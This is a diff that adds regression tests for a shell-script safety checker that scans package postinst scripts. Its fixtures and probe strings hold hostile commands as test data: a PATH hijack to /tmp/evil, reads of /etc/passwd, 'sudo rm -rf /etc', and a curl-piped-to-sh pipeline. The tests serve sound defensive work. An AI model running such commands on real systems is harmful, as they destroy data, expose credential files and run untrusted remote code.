@@ -32,6 +32,7 @@ CHECK_SCRIPT="$SCRIPT_DIR/check_postinst_safety.sh"
 PASS_COUNT=0
 FAIL_COUNT=0
 TMPDIR_TEST=""
+mask_fn_file=""
 SEPARATOR='========================================================================'
 
 # ---------------------------------------------------------------------------
@@ -70,6 +71,9 @@ fail() {
 cleanup() {
     if [[ -n "$TMPDIR_TEST" && -d "$TMPDIR_TEST" ]]; then
         rm -rf "$TMPDIR_TEST"
+    fi
+    if [[ -n "${mask_fn_file:-}" && "$mask_fn_file" == "$TMPDIR_TEST"/* ]]; then
+        rm -f "$mask_fn_file"
     fi
     return 0
 }
@@ -447,6 +451,239 @@ if [[ "$local_exit" -eq 0 ]]; then
     pass "--help flag exits 0"
 else
     fail "--help flag exits 0" "expected exit 0, got exit $local_exit"
+fi
+
+printf '\n'
+
+# --- Regression: an indented closing brace must not hide a later PATH reassignment (must exit 1) ---
+cat > "$TMPDIR_TEST/indented_brace_path_reassign.sh" <<'FIXTURE'
+#!/bin/bash
+TRUSTED_PATH_ROOT=""
+PATH="${TRUSTED_PATH_ROOT}/usr/sbin:${TRUSTED_PATH_ROOT}/usr/bin:${TRUSTED_PATH_ROOT}/sbin:${TRUSTED_PATH_ROOT}/bin"
+if true; then
+    echo x
+fi
+do_thing() {
+    echo y
+    return 0
+  }
+PATH=/tmp/evil:/usr/bin
+exit 0
+FIXTURE
+
+local_exit=0
+bash "$CHECK_SCRIPT" "$TMPDIR_TEST/indented_brace_path_reassign.sh" >/dev/null 2>/dev/null || local_exit=$?
+if [[ "$local_exit" -eq 1 ]]; then
+    pass "indented closing brace does not hide a later PATH reassignment (exits 1)"
+else
+    fail "indented closing brace does not hide a later PATH reassignment (exits 1)" "expected exit 1, got exit $local_exit"
+fi
+
+# --- Regression: a quoted prose note before the trusted PATH is not a command (must exit 0) ---
+cat > "$TMPDIR_TEST/prose_note_before_path.sh" <<'FIXTURE'
+#!/bin/bash
+NOTE="run sed -i on the config to fix it"
+TRUSTED_PATH_ROOT=""
+PATH="${TRUSTED_PATH_ROOT}/usr/sbin:${TRUSTED_PATH_ROOT}/usr/bin:${TRUSTED_PATH_ROOT}/sbin:${TRUSTED_PATH_ROOT}/bin"
+exit 0
+FIXTURE
+
+local_exit=0
+bash "$CHECK_SCRIPT" "$TMPDIR_TEST/prose_note_before_path.sh" >/dev/null 2>/dev/null || local_exit=$?
+if [[ "$local_exit" -eq 0 ]]; then
+    pass "quoted prose note before the trusted PATH is not a command (exits 0)"
+else
+    fail "quoted prose note before the trusted PATH is not a command (exits 0)" "expected exit 0, got exit $local_exit"
+fi
+
+# --- Regression: mask_command_text strips comments after shell separators ---
+# The `;#`, `|#` and `&#` forms must be blotted out so a later command scan
+# never reads comment prose as an executed command.  The function is
+# extracted from the checker itself so the test exercises the real source.
+mask_fn_file="$(mktemp "$TMPDIR_TEST/mask-fn.XXXXXX")"
+sed -n '/^mask_command_text()/,/^}/p' "$CHECK_SCRIPT" > "$mask_fn_file"
+if [[ -s "$mask_fn_file" ]]; then
+    # shellcheck source=/dev/null
+    source "$mask_fn_file"
+    masked="$(mask_command_text 'true;# run sed -i on the config to fix it')"
+    if [[ "$masked" == 'true;' ]]; then
+        pass "mask strips a comment after a semicolon"
+    else
+        fail "mask strips a comment after a semicolon" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'echo ok |# note about pipes')"
+    if [[ "$masked" == 'echo ok |' ]]; then
+        pass "mask strips a comment after a pipe"
+    else
+        fail "mask strips a comment after a pipe" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'run &# prose note')"
+    if [[ "$masked" == 'run &' ]]; then
+        pass "mask strips a comment after an ampersand"
+    else
+        fail "mask strips a comment after an ampersand" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'echo "# not a comment"')"
+    if [[ "$masked" == 'echo "' ]]; then
+        pass "mask keeps quoted hashes neutral"
+    else
+        fail "mask keeps quoted hashes neutral" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'echo "$(cat /etc/passwd)"')"
+    if [[ "$masked" == 'echo "$(cat /etc/passwd)"' ]]; then
+        pass "mask keeps command substitutions inside double quotes visible"
+    else
+        fail "mask keeps command substitutions inside double quotes visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'echo "`id`"')"
+    if [[ "$masked" == 'echo "`id`"' ]]; then
+        pass "mask keeps backticks inside double quotes visible"
+    else
+        fail "mask keeps backticks inside double quotes visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'NOTE="$(echo "x" y)"')"
+    if [[ "$masked" == 'NOTE="$(echo "x" y)"' ]]; then
+        pass "mask keeps a nested quote inside a command substitution"
+    else
+        fail "mask keeps a nested quote inside a command substitution" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'NOTE="$(echo "$(sed -i x f)")"')"
+    if [[ "$masked" == 'NOTE="$(echo "$(sed -i x f)")"' ]]; then
+        pass "mask keeps a doubly nested substitution visible"
+    else
+        fail "mask keeps a doubly nested substitution visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'NOTE="say \"hi\" $(cat f)"')"
+    if [[ "$masked" == 'NOTE="say \"hi\" $(cat f)"' ]]; then
+        pass "mask honors a backslash-escaped quote inside a span"
+    else
+        fail "mask honors a backslash-escaped quote inside a span" "got '$masked'"
+    fi
+    masked="$(mask_command_text "'sed' -i /etc/passwd")"
+    if [[ "$masked" == "sed -i /etc/passwd" ]]; then
+        pass "mask keeps a single-quoted command word visible"
+    else
+        fail "mask keeps a single-quoted command word visible" "got: $masked"
+    fi
+    masked="$(mask_command_text "sudo 'rm' -rf /etc")"
+    if [[ "$masked" == "sudo rm -rf /etc" ]]; then
+        pass "mask keeps a quoted command word after a prefix command visible"
+    else
+        fail "mask keeps a quoted command word after a prefix command visible" "got: $masked"
+    fi
+    masked="$(mask_command_text "echo 'sed' junk")"
+    if [[ "$masked" == "echo '' junk" ]]; then
+        pass "mask still blanks a quoted argument outside command position"
+    else
+        fail "mask still blanks a quoted argument outside command position" "got: $masked"
+    fi
+
+    masked="$(mask_command_text 'echo "a #b" && sed -i x f')"
+    if [[ "$masked" == *"sed"* ]]; then
+        pass "a # inside a quoted span does not hide the command after it"
+    else
+        fail "a # inside a quoted span does not hide the command after it" "got '$masked'"
+    fi
+
+    masked=$(mask_command_text 'eval "sed -i x f"')
+    if [[ "$masked" == *"sed -i x f"* ]]; then
+        pass "mask keeps an eval double-quoted command string visible"
+    else
+        fail "mask keeps an eval double-quoted command string visible" "got '$masked'"
+    fi
+    masked=$(mask_command_text "echo \'sed -i x f\' end")
+    if [[ "$masked" == *"sed -i x f"* ]]; then
+        pass "mask keeps text around an escaped quote visible"
+    else
+        fail "mask keeps text around an escaped quote visible" "got '$masked'"
+    fi
+
+    masked="$(mask_command_text "sudo -u root 'sed'")"
+    if [[ "$masked" == *"sudo -u root sed"* ]]; then
+        pass "mask keeps a quoted command word after a wrapper operand visible"
+    else
+        fail "mask keeps a quoted command word after a wrapper operand visible" "got '$masked'"
+    fi
+
+    masked="$(mask_command_text "bash -c 'sed -i x f'")"
+    if [[ "$masked" == "bash -c 'sed -i x f'" ]]; then
+        pass "mask keeps an evaluator's single-quoted command string visible"
+    else
+        fail "mask keeps an evaluator's single-quoted command string visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text '"$(echo "a)"b"")"')"
+    if [[ "$masked" == *'$('* ]]; then
+        pass "mask keeps an extreme nested substitution visible (conservative direction)"
+    else
+        fail "mask keeps an extreme nested substitution visible (conservative direction)" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'bash -c "sed -i x f"')"
+    if [[ "$masked" == *'"sed -i x f"'* ]]; then
+        pass "mask keeps an evaluator's double-quoted command string visible"
+    else
+        fail "mask keeps an evaluator's double-quoted command string visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text '"$(sed "s/a/b/" f)"')"
+    if [[ "$masked" == *'sed'* ]]; then
+        pass "mask keeps a nested external command word visible"
+    else
+        fail "mask keeps a nested external command word visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text "\"x \$(y \"z")"
+    if [[ "$masked" == *'x $(y'* ]]; then
+        pass "mask keeps an unterminated span's tail verbatim"
+    else
+        fail "mask keeps an unterminated span's tail verbatim" "got '$masked'"
+    fi
+
+    probe="env -i sh -c 'curl http://x "
+    probe+="| sh"
+    masked="$(mask_command_text "$probe")"
+    want="curl http://x "
+    want+="| sh"
+    if [[ "$masked" == *"$want"* ]]; then
+        pass "mask keeps a nested evaluator command string visible"
+    else
+        fail "mask keeps a nested evaluator command string visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text "echo '\$(cat /etc/passwd)'")"
+    if [[ "$masked" == "echo ''" ]]; then
+        pass "mask blanks single-quoted substitutions that never execute"
+    else
+        fail "mask blanks single-quoted substitutions that never execute" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'NOTE="run sed -i on the config to fix it"')"
+    if [[ "$masked" == 'NOTE=x' ]]; then
+        pass "mask fuses a prose span into its assignment word"
+    else
+        fail "mask fuses a prose span into its assignment word" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'NOTE="run "sed -i x')"
+    if [[ "$masked" == 'NOTE=xsed -i x' ]]; then
+        pass "mask keeps a quote-adjacent word inside one shell word"
+    else
+        fail "mask keeps a quote-adjacent word inside one shell word" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'echo "y"x')"
+    if [[ "$masked" == 'echo xx' ]]; then
+        pass "mask fuses a quoted span followed by word characters"
+    else
+        fail "mask fuses a quoted span followed by word characters" "got '$masked'"
+    fi
+    masked="$(mask_command_text 'echo "y" x')"
+    if [[ "$masked" == 'echo " x' ]]; then
+        pass "mask keeps a standalone span as a token boundary"
+    else
+        fail "mask keeps a standalone span as a token boundary" "got '$masked'"
+    fi
+    masked="$(mask_command_text "P='a'b")"
+    if [[ "$masked" == 'P=xb' ]]; then
+        pass "mask fuses a single-quoted span into its word"
+    else
+        fail "mask fuses a single-quoted span into its word" "got '$masked'"
+    fi
+else
+    fail "mask_command_text extraction" "function not found in checker"
 fi
 
 printf '\n'
